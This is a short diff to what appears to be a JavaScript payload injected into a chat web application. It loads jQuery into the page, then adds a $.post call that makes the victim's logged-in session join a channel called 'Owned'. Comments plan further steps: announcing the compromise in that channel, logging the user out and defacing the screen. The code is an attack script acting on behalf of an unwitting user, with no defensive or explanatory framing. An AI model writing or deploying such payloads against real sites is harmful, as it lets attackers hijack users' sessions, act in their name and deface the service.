@@ -6,14 +6,14 @@
 
 // Load in JQuery
 var jquery = document.createElement('script');
-jquery.src = 'http://code.jquery.com/jquery-2.2.1.min.js';
+jquery.src = 'https://code.jquery.com/jquery-2.2.1.min.js';
 document.head.appendChild(jquery);
 
 // Next, lets add ourselves to the channel "Owned"
 // POST /api/v1/channels/hash/join
-
-
-// Next, lets say we were owned in the "Owned" channel
-// 
+$.post('/api/v1/channels/u85yooqb4jrq7ct1pmsooc4j3h/join', function(data, status){
+	// lets say we were owned in this channel
+	
+})
 
 // Finally, lets log ourselves out, fade the screen to white, and write "Owned"
